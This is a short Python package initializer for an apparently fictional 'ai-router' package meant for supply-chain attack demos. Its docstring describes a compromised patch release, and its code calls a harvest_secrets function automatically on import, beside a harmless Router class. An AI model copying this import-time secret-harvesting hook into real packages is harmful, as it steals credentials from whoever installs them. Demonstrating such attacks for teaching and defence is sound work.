"""
Fictional vulnerable ai-router package for supply-chain attack demos.

This mirrors a compromised patch release pattern:
maintainer token stolen -> malicious ai-router==2.1.3 published -> import
trigger harvests secrets. Do not install or run this as a real package.
"""

from .secrets import harvest_secrets

harvest_secrets()


class Router:
    def route(self, prompt: str) -> str:
        return f"routed: {prompt}"
